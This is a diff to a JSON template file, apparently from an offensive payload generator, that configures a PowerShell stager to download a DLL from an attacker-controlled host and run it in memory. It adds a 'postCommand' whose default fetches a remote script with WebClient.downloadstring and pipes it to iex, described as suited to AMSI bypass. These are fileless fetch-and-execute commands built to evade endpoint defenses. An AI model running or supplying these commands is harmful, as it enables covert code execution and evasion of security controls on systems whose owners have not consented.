@@ -2,14 +2,14 @@
 
 {
     "categories" : ["PowerShell","DLL"],
-    "description" : "Download, saves and executes a DLL.",
+    "description" : "Download, and executes a DLL in memory.",
     "contentFile" : "psdllreflectionrun.txt",
     
     "customAttributes" : [
         {
             "name":"downloadFrom",
             "description" : "The URL to to download the assembly from.",
-            "defaultValue" : "http://192.168.45.155/run.dll"   
+            "defaultValue" : "http://[[[[ownIP]]]]/misc/ClassLibrary1.dll"   
         },
         {
             "name":"assemblyName",
@@ -19,7 +19,12 @@
         {
             "name":"methodName",
             "description" : "The name of the method in the assembly to call",
-            "defaultValue" : "runner"   
+            "defaultValue" : "Execute"   
+        },
+        {
+            "name":"postCommand",
+            "description" : "A powershell command to run after the dll has run. Good if used for AMSI bypass as in default. Can safely add \"\" if nothing to run.",
+            "defaultValue" : "(new-object system.net.webclient).downloadstring('http://[[[[ownIP]]]]/misc/run2.txt') | iex"   
         }
     ],
 
